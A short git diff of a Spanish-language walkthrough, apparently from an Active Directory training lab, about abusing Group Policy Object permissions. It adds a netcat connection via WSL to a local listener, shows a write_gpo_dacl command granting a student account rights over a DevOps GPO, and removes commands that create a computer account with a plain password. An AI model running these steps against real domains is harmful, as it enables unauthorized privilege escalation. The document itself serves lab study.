@@ -59,11 +59,15 @@ Ahora lo ejecutaremos con doble clic y esperaremos a recibir una conexión, una 
 .\netcat-win32-1.12\nc.exe 127.0.0.1 11000
 ```
 
+O con WSL
+```shell
+nc 127.0.0.1 11000
+```
+
 Ahora deberemos asignarle permisos con respecto a la GPO de DevOps `{0BF8D01C-1F62-4BDC-958C-57140B67D147}` usando
 ```shell
 write_gpo_dacl student97 {0BF8D01C-1F62-4BDC-958C-57140B67D147}
 ```
 
 Una vez añadidos a esta GPO podemos parar la ejecución de estas dos herramientas
-add_computer std97-gpattack Secretpass@123
-write_gpo_dacl std97-gpattack$ {0BF8D01C-1F62-4BDC-958C-57140B67D147}
+Ahora deberemos de crear una nueva plantilla
